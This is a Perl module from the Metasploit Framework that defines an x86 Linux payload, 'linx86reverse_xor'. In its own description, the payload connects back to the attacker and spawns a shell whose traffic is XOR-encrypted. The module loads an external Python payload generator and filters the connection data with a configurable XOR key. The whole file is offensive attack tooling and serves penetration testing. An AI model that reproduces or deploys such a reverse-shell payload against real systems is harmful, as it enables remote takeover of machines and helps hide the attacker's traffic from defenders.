package Msf::Payload::linx86_reverse_xor;
use strict;
use base 'Msf::PayloadComponent::ExternalPayload';
sub load {
  Msf::PayloadComponent::ExternalPayload->import('Msf::PayloadComponent::ReverseConnection');
}

my $info =
{
  'Name'         => 'linx86reverse_xor',
  'Version'      => '1.0',
  'Description'  => 'Connect back to attacker and spawn an encrypted shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Multistage'   => 0,
  'Type'         => 'reverse_shell_xor',
  'Size'         => 0,
  'UserOpts'     =>
    {
      'XKEY'  => [1, 'BYTE',  'Byte to xor the connection with', 0x69],
    }
};

sub new {
  load();
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info}, @_);
  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86reverse_xor.py';
  $self->{'Info'}->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({LHOST => '127.0.0.1', 'LPORT' => '4444', 'XKEY' => '55'});
  return length($bin);
}

sub RecvFilter {
  my $self = shift;
  my $data = shift;
  my $xkey = $self->GetVar('XKEY');
  $data = Pex::Encoder::XorByte($xkey, $data);
  return($data);
}

sub SendFilter {
  my $self = shift;
  my $data = shift;
  return($self->RecvFilter($data));
}
